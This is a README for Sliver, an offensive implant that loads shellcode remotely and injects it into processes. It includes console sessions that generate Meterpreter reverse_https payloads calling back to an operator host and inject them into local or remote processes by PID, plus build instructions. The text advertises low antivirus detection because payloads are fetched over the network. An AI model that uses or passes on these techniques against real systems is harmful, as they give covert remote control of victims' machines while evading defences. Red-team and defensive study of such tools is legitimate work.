Sliver
======

![Sliver](/sliver/sliver.jpeg)

Sliver is a remote shellcode loading and injection service that uses end-to-end encryption (mTLS) for all network traffic. Implants are dynamically compiled with unique X.509 certificates signed by a per-instance certificate authority generated when you first run the binary. Sliver can load arbitrary shellcode but also integrates with MSFVenom to automatically generate, execute, and manage Meterpreter payloads. Sliver binaries have very low anti-virus detection as they do not contain any malicous code themselves and instead dynamically load it over the network.

Sliver can inject payloads into it's own process or optionally use remote thread injection to execute payloads in a remote processes to which your execution context has access.

```
[attacker] <-(mTLS)-> [sliver] -(code injection)-> [remote process]
```

## Local Thread Execution

Execute shellcode in the local process:

```
sliver (NURSING_BEETLE) > msf -lhost 172.16.20.1
 msf -lhost 172.16.20.1
[*] Generating meterpreter_reverse_https windows/amd64 -> 172.16.20.1:4444 ...
[*] Successfully generated payload 207449 byte(s)
[*] Sending payload -> NURSING_BEETLE
[*] Sucessfully sent payload
```

## Remote Thread Injection

Inject shellcode into remote processes:

```
sliver (NURSING_BEETLE) > inject -pid 3100 -lhost 172.16.20.1
 inject -pid 3100 -lhost 172.16.20.1
[*] Generating meterpreter_reverse_https windows/amd64 -> 172.16.20.1:4444 ...
[*] Successfully generated payload 207449 byte(s)
[*] Sending payload -> NURSING_BEETLE -> PID: 3100
[*] Sucessfully sent payload
```

Sliver also has a built-in `ps` command.

## Multi-player Mode

Sliver can also execute multiple payloads per connection. This can be helpful if your meterpreter session dies, or if you want to play with friends:

```
sliver (STUPID_AIRBAG) > msf -lhost 172.16.20.1
 msf -lhost 172.16.20.1
[*] Generating windows/amd64 -> 172.16.20.1:4444 ...
[*] Successfully generated payload 207449 byte(s)
[*] Sending payload -> STUPID_AIRBAG
[*] Sucessfully sent payload
sliver (STUPID_AIRBAG) > msf -lhost 172.16.20.2
 msf -lhost 172.16.20.2
[*] Generating windows/amd64 -> 172.16.20.2:4444 ...
[*] Successfully generated payload 207449 byte(s)
[*] Sending payload -> STUPID_AIRBAG
[*] Sucessfully sent payload
```

## Building From Scratch ##

You'll want to compile from a MacOS or Linux machine, compiling from Windows should work but none of the scripts are designed to run on Windows (you can compile the Windows binaries from MacOS or Linux).

Requirements:
* Metasploit Framework v5 or later
* Go v1.11 or later
* Make, sed, tar, wget, zip

Build thin server (for developement)

```
$ ./deps.sh
$ ./go-assets.sh
$ make
```

Statically compile and bundle server with all dependencies and assets:

```
$ make static-macos
$ make static-linux
$ make static-windows
```
